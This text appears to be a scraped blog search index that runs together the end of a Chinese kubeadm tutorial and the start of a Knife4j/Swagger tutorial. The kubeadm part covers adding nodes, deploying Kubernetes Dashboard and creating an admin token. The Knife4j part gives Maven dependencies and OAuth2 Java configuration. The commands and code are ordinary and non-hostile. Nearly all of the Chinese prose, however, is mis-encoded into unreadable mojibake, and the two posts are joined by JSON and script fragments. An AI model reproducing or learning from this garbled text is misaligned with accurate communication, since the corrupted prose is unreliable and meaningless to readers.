v1.18.0 å°† Node èŠ‚ç‚¹åŠ å…¥åˆ° Kubernetes é›†ç¾¤åœ¨å„ä¸ª Node èŠ‚ç‚¹é‡Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå‘ Kubernetes é›†ç¾¤æ·»åŠ æ–°èŠ‚ç‚¹ï¼Œè¯¥å‘½ä»¤æ˜¯ä¸Šè¿° kubeadm init å‘½ä»¤æ‰§è¡Œå®Œæˆååœ¨ç»ˆç«¯è®°å½•ä¸‹æ¥çš„ 12# æ·»åŠ NodeèŠ‚ç‚¹åˆ°é›†ç¾¤# kubeadm join 192.168.1.109:6443 --token jve1cd.3ulp5fqifsptti23 --discovery-token-ca-cert-hash sha256:01229ee179cf13855dbf38bc050b3251928571996d60878f30ce13c08aaa62d5 æµ‹è¯• Kubernetes é›†ç¾¤åŠŸèƒ½åœ¨ Master èŠ‚ç‚¹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹é›†ç¾¤ä¸­æ‰€æœ‰èŠ‚ç‚¹çš„çŠ¶æ€ï¼Œå½“å®ƒä»¬çš„çŠ¶æ€éƒ½ä¸º Ready æ—¶ï¼Œè¡¨ç¤º Kubernetes é›†ç¾¤å·²ç»æˆåŠŸæ­å»ºèµ·æ¥äº†ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œé›†ç¾¤ä¸­æ‰€æœ‰èŠ‚ç‚¹çš„çŠ¶æ€å˜æ›´ä¸º Readyï¼Œè¿™éœ€è¦èŠ±è¾ƒé•¿æ—¶é—´ï¼Œå¯èƒ½èŠ±åå‡ åˆ†é’Ÿç”šè‡³å‡ ååˆ†é’Ÿ 1234567891011121314151617181920212223242526272829303132# æŸ¥çœ‹é›†ç¾¤çŠ¶æ€# kubectl get nodesNAME STATUS ROLES AGE VERSIONk8s-master Ready master 9m37s v1.18.0k8s-node1 Ready &lt;none&gt; 2m43s v1.18.0k8s-node2 Ready &lt;none&gt; 11s v1.18.0k8s-node3 Ready &lt;none&gt; 1s v1.18.0# æŸ¥è¯¢Podç»„ä»¶çš„çŠ¶æ€# kubectl get pods -n kube-systemNAME READY STATUS RESTARTS AGEcoredns-7ff77c879f-67rjn 1/1 Running 0 30mcoredns-7ff77c879f-xpq9h 1/1 Running 0 30metcd-k8s-master 1/1 Running 0 30mkube-apiserver-k8s-master 1/1 Running 0 30mkube-controller-manager-k8s-master 1/1 Running 0 30mkube-flannel-ds-4jtp4 1/1 Running 0 28mkube-flannel-ds-6k8sp 1/1 Running 0 23mkube-flannel-ds-bzwrt 1/1 Running 0 23mkube-flannel-ds-rc8vv 1/1 Running 0 23mkube-proxy-8bbhk 1/1 Running 0 30mkube-proxy-9f96v 1/1 Running 0 23mkube-proxy-9j6qh 1/1 Running 0 23mkube-proxy-bqm7t 1/1 Running 0 23mkube-scheduler-k8s-master 1/1 Running 0 30m# æŸ¥çœ‹é›†ç¾¤ç‰ˆæœ¬# kubectl version --shortClient Version: v1.18.0Server Version: v1.18.0# æç¤ºï¼šå½“å„èŠ‚ç‚¹çš„ Linux ç³»ç»Ÿé‡å¯åï¼ŒKubernetes é›†ç¾¤é‡Œå¯¹åº”çš„ç»„ä»¶ä¼šè‡ªåŠ¨å¯åŠ¨ï¼Œä¸éœ€è¦äººä¸ºå¹²é¢„ åœ¨ Master èŠ‚ç‚¹é‡Œåˆ›å»ºä¸€ä¸ª Nginx å®¹å™¨ï¼ŒéªŒè¯ Kubernetes é›†ç¾¤æ˜¯å¦æ­£å¸¸è¿è¡Œ 123456789101112131415161718# åˆ›å»ºNginxå®¹å™¨# kubectl create deployment nginx --image=nginx# æš´éœ²Nginxçš„ç«¯å£# kubectl expose deployment nginx --port=80 --type=NodePort# æŸ¥çœ‹Podç»„ä»¶# kubectl get podNAME READY STATUS RESTARTS AGEpod/nginx-f89759699-59cb7 1/1 Running 0 2m1s# æŸ¥çœ‹Svc# kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEservice/kubernetes ClusterIP 10.96.0.1 &lt;none&gt; 443/TCP 48mservice/nginx NodePort 10.102.129.11 &lt;none&gt; 80:32517/TCP 10s# æç¤ºï¼šæµè§ˆå™¨è®¿é—® "http://&lt;any_node_ip&gt;:32517"ï¼Œè‹¥ Ngninx å®¹å™¨åœ¨é›†ç¾¤ä¸­åˆ›å»ºå¹¶å¯åŠ¨æˆåŠŸï¼Œåˆ™é»˜è®¤ä¼šæ‰“å¼€ Nginx çš„é¦–é¡µ Kubeadm éƒ¨ç½² Dashboard å¯è§†åŒ–æ’ä»¶åœ¨ Kubeadm éƒ¨ç½² Dashboard å¯è§†åŒ–æ’ä»¶çš„æµç¨‹ä¸­ï¼Œä»¥ä¸‹æ‰€æœ‰æ“ä½œéƒ½æ˜¯ç›´æ¥åœ¨ Master èŠ‚ç‚¹é‡Œæ‰§è¡Œï¼Œåç»­ä¸å†ç´¯è¿°ã€‚ Dashboard ç®€ä»‹åœ¨ Kubernetes ç¤¾åŒºä¸­ï¼Œæœ‰ä¸€ä¸ªå¾ˆå—æ¬¢è¿çš„ Dashboard é¡¹ç›®ï¼Œå®ƒå¯ä»¥ç»™ç”¨æˆ·æä¾›ä¸€ä¸ªå¯è§†åŒ–çš„ Web ç•Œé¢æ¥æŸ¥çœ‹å½“å‰é›†ç¾¤çš„å„ç§ä¿¡æ¯ã€‚ç”¨æˆ·å¯ä»¥ç”¨ Kubernetes Dashboard éƒ¨ç½²å®¹å™¨åŒ–çš„åº”ç”¨ã€ç›‘æ§åº”ç”¨çš„çŠ¶æ€ã€æ‰§è¡Œæ•…éšœæ’æŸ¥ä»»åŠ¡ä»¥åŠç®¡ç† Kubernetes å„ç§èµ„æºã€‚ Dashboard å®˜æ–¹å‚è€ƒæ–‡æ¡£ Dashboard Github é¡¹ç›®åœ°å€ Dashboard å„ç‰ˆæœ¬è¯´æ˜ï¼ŒDashboard ç‰ˆæœ¬ä¸ Kubernetes ç‰ˆæœ¬å¿…é¡»åŒ¹é…ï¼ˆå…¼å®¹ï¼‰ Dashboard éƒ¨ç½²æ‰§è¡Œ YAML æ–‡ä»¶ç›´æ¥éƒ¨ç½² Dashboardï¼Œè¿™é‡Œçš„ Kubernetes 1.8 ç‰ˆæœ¬å¯¹åº”çš„ Dashboard ç‰ˆæœ¬ä¸º v2.0.3ï¼Œä¸¤è€…çš„ç‰ˆæœ¬å·å¿…é¡»åŒ¹é… 12# éƒ¨ç½²# kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml æŸ¥çœ‹ Dashboard çš„è¿è¡ŒçŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°ä»¥ deployment æ–¹å¼éƒ¨ç½²ï¼Œè¿è¡Œäº† 2 ä¸ª Pod åŠ 2 ä¸ª Service 1234567891011# æŸ¥çœ‹Podçš„çŠ¶æ€# kubectl -n kubernetes-dashboard get podsNAME READY STATUS RESTARTS AGEdashboard-metrics-scraper-6b4884c9d5-wn22s 0/1 ContainerCreating 0 48skubernetes-dashboard-7f99b75bf4-fn956 0/1 ContainerCreating 0 48s# æŸ¥çœ‹Svcçš„çŠ¶æ€# kubectl -n kubernetes-dashboard get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEdashboard-metrics-scraper ClusterIP 10.96.115.247 &lt;none&gt; 8000/TCP 117skubernetes-dashboard ClusterIP 10.100.88.170 &lt;none&gt; 443/TCP 117s Dashboard æš´éœ²æœåŠ¡è¿™é‡Œä½œä¸ºæ¼”ç¤ºï¼Œä½¿ç”¨ NodePort æ–¹å¼å°† Dashboard çš„æœåŠ¡æš´éœ²åœ¨é›†ç¾¤å¤–ï¼ŒæŒ‡å®šä½¿ç”¨ 30443 ç«¯å£ï¼ˆå¯è‡ªå®šä¹‰ï¼‰ 12345678# æš´éœ²Service# kubectl patch svc kubernetes-dashboard -n kubernetes-dashboard -p \'{"spec":{"type":"NodePort","ports":[{"port":443,"targetPort":8443,"nodePort":30443}]}}\'# æŸ¥çœ‹æš´éœ²çš„Service# kubectl -n kubernetes-dashboard get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEdashboard-metrics-scraper ClusterIP 10.96.115.247 &lt;none&gt; 8000/TCP 6m2skubernetes-dashboard NodePort 10.100.88.170 &lt;none&gt; 443:30443/TCP 6m2s æˆ–è€…ä¸‹è½½ YAML æ–‡ä»¶ï¼Œæ‰‹åŠ¨æ›´æ”¹ Service éƒ¨åˆ†çš„ç«¯å£ï¼Œå¹¶ä»¥ä¸º NodePort æ–¹å¼è¿›è¡Œéƒ¨ç½² 1234567891011121314151617181920212223242526# ä¸‹è½½YAMLæ–‡ä»¶# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml# æ›´æ”¹YAMLæ–‡ä»¶# vim recommended.yaml---kind: ServiceapiVersion: v1metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kubernetes-dashboardspec: type: NodePort ports: - port: 443 targetPort: 8443 nodePort: 30443 selector: k8s-app: kubernetes-dashboard---# æ›´æ–°é…ç½®# kubectl apply -f recommended.yaml Dashboard è®¤è¯æ–¹å¼ç™»å½•Dashboard æ”¯æŒ Kubeconfig å’Œ Token ä¸¤ç§è®¤è¯æ–¹å¼ï¼Œè¿™é‡Œé€‰æ‹© Token è®¤è¯æ–¹å¼ç™»å½•ï¼Œé¦–å…ˆæ‰§è¡Œä»¥ä¸‹æ“ä½œåˆ›å»ºç™»å½•ç”¨æˆ· 12345# åˆ›å»ºYAMLé…ç½®æ–‡ä»¶ï¼Œå¤åˆ¶ä¸‹é¢çš„å†…å®¹åˆ°æ–‡ä»¶ä¸­# vim dashboard-adminuser.yaml# åˆ›å»ºç™»å½•ç”¨æˆ·# kubectl apply -f dashboard-adminuser.yaml YAML é…ç½®æ–‡ä»¶ dashboard-adminuser.yaml çš„å®Œæ•´å†…å®¹å¦‚ä¸‹ï¼ŒæŒ‡å®šäº†ä¸€ä¸ªåç§°ä¸º admin-user çš„æœåŠ¡è´¦å·ï¼Œå¹¶æ”¾åœ¨ kubernetes-dashboard å‘½åç©ºé—´ä¸‹ï¼Œå¹¶å°† cluster-admin è§’è‰²ç»‘å®šåˆ° admin-user è´¦æˆ·ï¼Œè¿™æ · admin-user è´¦æˆ·å°±æœ‰äº†ç®¡ç†å‘˜çš„æƒé™ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒKubeadm åˆ›å»ºé›†ç¾¤æ—¶å·²ç»åˆ›å»ºäº† cluster-admin è§’è‰²ï¼Œåªéœ€ç›´æ¥ç»‘å®šå³å¯ 1234567891011121314151617181920---apiVersion: v1kind: ServiceAccountmetadata: name: admin-user namespace: kubernetes-dashboard---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata: name: admin-userroleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: cluster-adminsubjects:- kind: ServiceAccount name: admin-user namespace: kubernetes-dashboard æŸ¥çœ‹ admin-user è´¦æˆ·çš„ Token 12# æŸ¥çœ‹Token# kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk \'{print $1}\') ä½¿ç”¨ç«ç‹æµè§ˆå™¨æ‰“å¼€ https://&lt;any_node_ip&gt;:30443ï¼Œè®¿é—® Dashboard çš„ç™»å½•ç•Œé¢ï¼Œç”±äºè°·æ­Œæµè§ˆå™¨ä¼šå¼ºåˆ¶ä½¿ç”¨ HTTPS åè®®ï¼Œè¿™å°†å¯¼è‡´æ— æ³•è®¿é—® Dashboard çš„ç™»å½•é¡µé¢ï¼Œå› æ­¤å»ºè®®ä½¿ç”¨ç«ç‹æµè§ˆå™¨è¿›è¡Œè®¿é—® å°†è·å–åˆ°çš„ Token å¤åˆ¶åˆ°ç™»å½•ç•Œé¢çš„ Token è¾“å…¥æ¡†ä¸­ï¼ŒæˆåŠŸç™»é™† Dashboard Dashboard ç™»å½•è¶…æ—¶Dashboard é»˜è®¤ç™»å½•è¶…æ—¶æ—¶é—´æ˜¯ 15minï¼Œå¯ä»¥ä¸º Dashboard å®¹å™¨å¢åŠ  --token-ttl å‚æ•°æ¥è‡ªå®šä¹‰è¶…æ—¶æ—¶é—´ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456789101112131415# ä¸‹è½½YAMLæ–‡ä»¶# wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.3/aio/deploy/recommended.yaml# æ›´æ”¹YAMLæ–‡ä»¶# vim recommended.yaml---args: - --auto-generate-certificates - --namespace=kubernetes-dashboard - --token-ttl=43200---# æ›´æ–°é…ç½®# kubectl apply -f recommended.yaml Kubeadm æ­å»ºé›†ç¾¤é—®é¢˜æ€»ç»“1[ERROR NumCPU]: the number of available CPUs 1 is less than the required 2 æ‰§è¡Œ kubeadm init å‘½ä»¤ï¼Œæç¤º CPU æ ¸å¿ƒæ•°å°‘äº 2ï¼Œå¯ä»¥æ·»åŠ å‘½ä»¤å‚æ•° --ignore-preflight-errors=NumCPU å¿½ç•¥è­¦å‘Š 1[ERROR Swap]: running with swap on is not supported. Please disable swap æ‰§è¡Œ kubeadm init å‘½ä»¤ï¼Œæç¤ºå¯ç”¨äº† swap åˆ†åŒºï¼Œå¯ä»¥æ·»åŠ å‘½ä»¤å‚æ•° --ignore-preflight-errors \'Swap\' å¿½ç•¥é”™è¯¯ 1[WARNING SystemVerification]: this Docker version is not on the list of validated versions: 19.03.1. Latest validated version: 18.09 æ‰§è¡Œ kubeadm init å‘½ä»¤ï¼Œæç¤º Docker çš„ç‰ˆæœ¬è¿‡é«˜ï¼Œå¯èƒ½ä¸ Kubernetes çš„ç‰ˆæœ¬ä¸å…¼å®¹ 1The connection to the server raw.githubusercontent.com was refused - did you specify the right host or port? æ‰§è¡Œ kubectl apply -f å‘½ä»¤ï¼Œæç¤ºç½‘ç»œé“¾æ¥å¤±è´¥ï¼Œè¿™æ˜¯å›½å†…æ— æ³•è®¿é—® raw.githubusercontent.com å¯¼è‡´ï¼Œä¸´æ—¶è§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š åœ¨ https://www.ipaddress.com ç½‘ç«™ä¸ŠæŸ¥è¯¢ raw.githubusercontent.com åŸŸåçš„çœŸå® IP åœ°å€ æ›´æ”¹ç³»ç»Ÿçš„ /etc/hosts é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸€è¡Œå†…å®¹ 185.199.108.133 raw.githubusercontent.comï¼Œå°† 185.199.108.133 æ›¿æ¢ä¸ºæŸ¥è¯¢åˆ°çœŸå®çš„ IP åœ°å€ é‡æ–°æ‰§è¡Œ kubectl apply -f å‘½ä»¤å³å¯ å‚è€ƒèµ„æ–™ Kubernetes éƒ¨ç½² Dashboard å¯è§†åŒ–æ’ä»¶ Kubeadm éƒ¨ç½²å• Master èŠ‚ç‚¹ Kubernetes é›†ç¾¤ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Knife4j åŸºç¡€ä½¿ç”¨æ•™ç¨‹",url:"/posts/e2246230.html",text:'1ã€å‰è¨€1.1ã€Knife4j ç®€ä»‹Knife4j æ˜¯ä¸º Java MVC æ¡†æ¶é›†æˆ Swagger ç”Ÿæˆ Api æ–‡æ¡£çš„å¢å¼ºè§£å†³æ–¹æ¡ˆï¼Œå‰èº«æ˜¯ swagger-bootstrap-uiï¼Œè‡´åŠ›äº springfox-swagger çš„å¢å¼º UI å®ç°ã€‚knife4j ä¸ºäº†å¥‘åˆå¾®æœåŠ¡çš„æ¶æ„å‘å±•ï¼Œç”±äºåŸæ¥ swagger-bootstrap-ui é‡‡ç”¨çš„æ˜¯åç«¯ Java ä»£ç  + å‰ç«¯ UI æ··åˆæ‰“åŒ…çš„æ–¹å¼ï¼Œåœ¨å¾®æœåŠ¡æ¶æ„ä¸‹æ˜¾çš„å¾ˆè‡ƒè‚¿ï¼Œå› æ­¤é¡¹ç›®æ­£å¼æ›´åä¸º knife4jï¼Œæ›´ååä¸»è¦ä¸“æ³¨çš„æ–¹é¢å¦‚ä¸‹ï¼š åç«¯ Java ä»£ç ä»¥åŠå‰ç«¯ UI æ¨¡å—è¿›è¡Œäº†åˆ†ç¦»ï¼Œåœ¨å¾®æœåŠ¡æ¶æ„ä¸‹ä½¿ç”¨æ›´åŠ çµæ´» æä¾›ä¸“æ³¨äº Swagger çš„å¢å¼ºè§£å†³æ–¹æ¡ˆï¼Œä¸åŒäºåªæ˜¯å•çº¯å¢å¼ºå‰ç«¯ UI éƒ¨åˆ† 1.2ã€Knife4j æ¨¡å— æ¨¡å—åç§° è¯´æ˜ knife4j ä¸º Java MVC æ¡†æ¶é›†æˆ Swagger çš„å¢å¼ºè§£å†³æ–¹æ¡ˆ knife4j-admin äº‘ç«¯ Swagger æ¥å£æ–‡æ¡£æ³¨å†Œç®¡ç†ä¸­å¿ƒï¼Œé›†æˆ gateway ç½‘å…³å¯¹ä»»æ„å¾®æœåŠ¡æ–‡æ¡£è¿›è¡Œç»„åˆé›†æˆ knife4j-extension chrome æµè§ˆå™¨çš„å¢å¼º swagger æ¥å£æ–‡æ¡£ ui, å¿«é€Ÿæ¸²æŸ“ swagger èµ„æº knife4j-service ä¸º swagger æœåŠ¡çš„ä¸€ç³»åˆ—æ¥å£æœåŠ¡ç¨‹åº knife4j-front knife4j-spring-ui çš„çº¯å‰ç«¯é™æ€ç‰ˆæœ¬ï¼Œç”¨äºé›†æˆé Java è¯­è¨€ä½¿ç”¨ swagger-bootstrap-ui knife4j çš„å‰èº«ï¼Œæœ€åå‘å¸ƒç‰ˆæœ¬æ˜¯ 1.9.6 1.3ã€ä½¿ç”¨ Knife4j çš„ä¸šåŠ¡åœºæ™¯è‹¥ä¸ä½¿ç”¨ knife4j çš„å¢å¼ºåŠŸèƒ½ï¼Œç›¸å½“äºçº¯ç²¹æ¢äº†ä¸€ä¸ª Swagger çš„å‰ç«¯ç•Œé¢ï¼Œè¿™ç§æƒ…å†µæ˜¯æœ€ç®€å•çš„ï¼ŒåŸé¡¹ç›®ç»“æ„ä¸‹æ— éœ€ä½œä»»ä½•å˜æ›´ï¼Œå¯ä»¥ç›´æ¥å¼•ç”¨ swagger-bootstrap-ui çš„æœ€åä¸€ä¸ªç‰ˆæœ¬ 1.9.6 æˆ–è€…ä½¿ç”¨ knife4j-spring-ui 123456&lt;!-- æ—§ç‰ˆæœ¬å¼•ç”¨ --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;`swagger-bootstrap-ui`&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt;&lt;/dependency&gt; 123456&lt;!-- æ–°ç‰ˆæœ¬å¼•ç”¨ --&gt;&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-ui&lt;/artifactId&gt; &lt;version&gt;${lastVersion}&lt;/version&gt;&lt;/dependency&gt; è‹¥åœ¨ Spring Boot é¡¹ç›®å•ä½“æ¶æ„ä½¿ç”¨å¢å¼ºåŠŸèƒ½ï¼Œknife4j æä¾›äº† starter ä¾›å¼€å‘è€…å¿«é€Ÿä½¿ç”¨ï¼Œè¯¥åŒ…ä¼šå¼•ç”¨ knife4j æä¾›çš„æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬å‰ç«¯ UI å’Œåç«¯çš„ Jar åŒ… 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; è‹¥åœ¨ Spring Cloud çš„å¾®æœåŠ¡æ¶æ„ä¸‹ï¼Œæ¯ä¸ªå¾®æœåŠ¡å…¶å®å¹¶ä¸éœ€è¦å¼•å…¥å‰ç«¯çš„ UI èµ„æºï¼Œå› æ­¤åœ¨æ¯ä¸ªå¾®æœåŠ¡çš„ Spring Boot é¡¹ç›®é‡Œï¼Œåªéœ€å¼•å…¥ knife4j æä¾›çš„å¾®æœåŠ¡ starter å³å¯ 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-micro-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; æœ€ååœ¨ Spring Cloud çš„ç½‘å…³èšåˆæ–‡æ¡£æœåŠ¡ï¼ˆå¦‚ Zuulã€Gatewayï¼‰é‡Œï¼Œå†æŠŠå‰ç«¯çš„ UI èµ„æºå¼•å…¥ 12345&lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;${knife4j.version}&lt;/version&gt;&lt;/dependency&gt; ä¸ç®¡æ˜¯ knife4j è¿˜æ˜¯ swagger-bootstrap-uiï¼Œå¯¹å¤–æä¾›çš„è®¿é—®åœ°å€ä¾ç„¶æ˜¯ http://ip:port/doc.htmlï¼›åŒæ—¶ swagger-bootstrap-ui ä½¿ç”¨çš„æ˜¯ä¼ ç»Ÿçš„ Javascript æŠ€æœ¯ï¼Œå³ jQuery + DOM æ“ä½œï¼Œæ‰“åŒ…åçš„æºç å¹¶æ²¡æœ‰å‹ç¼©å¤„ç†ï¼Œè€Œ knife4j çš„å‰ç«¯åˆ™é‡‡ç”¨ Vueã€‚ 2ã€Spring å•ä½“æ¶æ„2.1ã€åŸºäº Maven Bom æ–¹å¼ä½¿ç”¨ åŸºäº Maven Bom æ–¹å¼ä½¿ç”¨ 2.2ã€Spring MVC æ¡†æ¶é›†æˆ Knife4j Spring MVC æ¡†æ¶é›†æˆ Knife4j 2.3ã€Spring Boot æ¡†æ¶é›†æˆ Knife4j Spring Boot æ¡†æ¶é›†æˆ Knife4j 3ã€Spring Cloud å¾®æœåŠ¡æ¶æ„3.1ã€Spring Cloud Zuul é›†æˆ Knife4j Spring Cloud Zuul é›†æˆ Knife4j 3.2ã€Spring Cloud Gateway é›†æˆ Knife4j Spring Cloud Gateway é›†æˆ Knife4j 4ã€å¾®æœåŠ¡èšåˆå®æˆ˜4.1ã€Eureka èšåˆ Knife4j Eureka èšåˆ Knife4j 4.2ã€Nacos èšåˆ Knife4j Nacos èšåˆ Knife4j 4.3ã€Gateway èšåˆ Knife4jGateway èšåˆ Knife4j åï¼Œè‹¥éœ€è¦å¯¹ä¸šåŠ¡æ¨¡å—çš„çš„ API æ–‡æ¡£æ¥å£ /v2/api-doc æ·»åŠ  Basic èº«ä»½è®¤è¯ï¼Œåˆ™åªéœ€åœ¨å¯¹åº”çš„ä¸šåŠ¡æ¨¡å—ä¸‹çš„ YML é…ç½®æ–‡ä»¶é‡Œæ·»åŠ ä»¥ä¸‹å†…å®¹å³å¯ï¼š 12345678knife4j: cors: true enable: true # æ˜¯å¦å¼€å¯å¢å¼ºé…ç½® basic: username: test # Basicè®¤è¯ç”¨æˆ·å password: 987789 # Basicè®¤è¯å¯†ç  enable: true # å¼€å¯Basicèº«ä»½è®¤è¯ production: false # æ˜¯å¦å±è”½æ‰€æœ‰Swaggerçš„ç›¸å…³èµ„æºï¼Œé»˜è®¤æ˜¯false è‹¥ä¸šåŠ¡æ¨¡å—é…ç½®äº†ä¸Šè¿°çš„ Basic èº«ä»½è®¤è¯åï¼Œæ­¤æ—¶è®¿é—® Gateway çš„èšåˆæ–‡æ¡£æœåŠ¡çš„ Web ç•Œé¢ï¼Œä¼šå¼¹å‡ºç”¨æˆ·åå’Œå¯†ç çš„è¾“å…¥æ¡†ï¼ˆå¦‚ä¸‹å›¾ï¼‰ 5ã€Knife4j æ•´åˆ OAuth2.0Knife4j æ•´åˆ OAuth2.0 çš„ Java ä»£ç é…ç½®å¦‚ä¸‹ï¼Œå…³é”®åœ¨äºåˆ›å»º Docket å¯¹è±¡æ—¶ï¼ŒæŒ‡å®š OAuth2.0 çš„æˆæƒæ¨¡å¼ï¼ŒåŒ…æ‹¬ç®€åŒ–æ¨¡å¼ (implicit)ã€æˆæƒç æ¨¡å¼ (authorization_code)ã€å¯†ç æ¨¡å¼ (password)ã€å®¢æˆ·ç«¯æ¨¡å¼ (client_credentials)ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ— è®ºé¡¹ç›®é‡‡ç”¨ Spring å•ä½“æ¶æ„è¿˜æ˜¯ Spring Cloud å¾®æœåŠ¡æ¶æ„ï¼Œä¸‹é¢ä»‹ç»çš„ Knife4j + OAuth2.0 çš„æ•´åˆæ–¹å¼éƒ½é€‚ç”¨ï¼ŒåŒ…æ‹¬ Gateway + Knife4j + OAuth2.0 æ•´åˆçš„é¡¹ç›®ã€‚ ä¸‹é¢æåˆ°çš„ @EnableBeanValidator æ³¨è§£ç±»çš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112import org.springframework.context.annotation.Import;import springfox.bean.validators.configuration.BeanValidatorPluginsConfiguration;import java.lang.annotation.*;@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.TYPE})@Documented@Import(BeanValidatorPluginsConfiguration.class)public @interface EnableBeanValidator {} æ‰‹åŠ¨æ–¹å¼ â˜…å±•å¼€ä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.ApiInfo;import springfox.documentation.service.ApiKey;import springfox.documentation.service.AuthorizationScope;import springfox.documentation.service.SecurityReference;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.Collections;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.basePackage("com.shop")) .paths(PathSelectors.any()) .build() // æ•´åˆOAuth2.0 .securitySchemes(Collections.singletonList(apiKey())) .securityContexts(Collections.singletonList(securityContext())); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j æ¥å£æ–‡æ¡£") .description("ä¸šåŠ¡æ¥å£ API æ–‡æ¡£.") .termsOfServiceUrl("") .version("v1.0.0") .build(); } private ApiKey apiKey() { return new ApiKey("Bearer", "Authorization", "header"); } /** * Swagger2 è®¤è¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ * * @return */ private SecurityContext securityContext() { return SecurityContext.builder() .securityReferences(defaultAuth()) .forPaths(PathSelectors.any()) .build(); } /** * è®¤è¯æ–¹å¼ * * @return */ private List&lt;SecurityReference&gt; defaultAuth() { AuthorizationScope authorizationScope = new AuthorizationScope("web", "access_token"); AuthorizationScope[] authorizationScopes = new AuthorizationScope[1]; authorizationScopes[0] = authorizationScope; return Collections.singletonList(new SecurityReference("Bearer", authorizationScopes)); }} æœ€ç»ˆå‘ˆç°çš„ç•Œé¢å¦‚ä¸‹ï¼Œå¡«å†™æå‰è·å–åˆ°çš„ Access Token å³å¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š åˆ·æ–°ä¸šåŠ¡æ¥å£çš„è°ƒè¯•ç•Œé¢ï¼Œå°±ä¼šçœ‹åˆ°å‚æ•° Authorization å€¼å·²ç»æ›´æ–°äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š å®¢æˆ·ç«¯æ¨¡å¼ â˜…å±•å¼€ä»£ç â˜… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.google.common.collect.Lists;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import springfox.documentation.builders.ApiInfoBuilder;import springfox.documentation.builders.OAuthBuilder;import springfox.documentation.builders.PathSelectors;import springfox.documentation.builders.RequestHandlerSelectors;import springfox.documentation.service.*;import springfox.documentation.spi.DocumentationType;import springfox.documentation.spi.service.contexts.SecurityContext;import springfox.documentation.spring.web.plugins.Docket;import springfox.documentation.swagger2.annotations.EnableSwagger2WebMvc;import java.util.ArrayList;import java.util.List;@Configuration@EnableBeanValidator@EnableSwagger2WebMvcpublic class SwaggerConfiguration { @Bean public Docket createRestApi() { return new Docket(DocumentationType.SWAGGER_2) .select() .apis(RequestHandlerSelectors.basePackage("com.example")) .paths(PathSelectors.any()) .build() .securityContexts(securityContexts()) .securitySchemes(securitySchemes()) .apiInfo(apiInfo()); } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("Knife4j æ¥å£æ–‡æ¡£") .description("ä¸šåŠ¡æ¥å£ API æ–‡æ¡£.") .termsOfServiceUrl("") 